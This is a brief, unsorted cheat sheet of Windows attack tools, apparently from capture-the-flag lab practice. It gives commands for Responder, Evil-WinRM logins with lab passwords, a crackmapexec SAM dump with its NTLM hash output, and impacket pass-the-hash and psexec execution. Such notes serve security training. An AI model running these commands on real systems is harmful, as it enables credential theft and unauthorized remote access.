# Tools / ORDENAR ESTO


## mimikatz
Mimikatz is a hacking tool that extracts Windows authentication credentials from memory, including passwords and hashes. It can then use these credentials to gain unauthorized access, escalate privileges, and perform further attacks.



## Responder
`sudo responder -I tun0`

## Evil-Winrm
```
evil-winrm -i [TARGET] -u maya -p m4y4ngs4ri
evil-winrm -i 10.129.136.91 -u administrator -p badminton
```

## crackmapexec
`crackmapexec smb [TARGET] -u maya -p "m4y4ngs4ri" --sam`
...
MB         10.10.11.14     445    MAILING          localadmin:1001:aad3b435b51404eeaad3b435b51404ee:9aa582783780d1546d62f2d102daefae:::
...


## impacket
- <https://github.com/fortra/impacket>

```
impacket-wmiexec localadmin@10.10.11.14 -hashes "aad3b435b51404eeaad3b435b51404ee:9aa582783780d1546d62f2d102daefae"




impacket-mssqlclient ARCHETYPE/sql_svc@${ip} -windows-auth
python3 mssqlclient.py ARCHETYPE/sql_svc@{TARGET_IP} -windows-auth

impacket-psexec administrator@${ip}
python3 psexec.py administrator@{TARGET_IP}
# PsExec is a light-weight telnet-replacement that lets you execute processes on other systems
# https://learn.microsoft.com/en-us/sysinternals/downloads/psexec




```

## nc
https://github.com/int0x33/nc.exe/blob/master/nc64.exe


## winPEAS
winPEASx64.exe
- <https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation>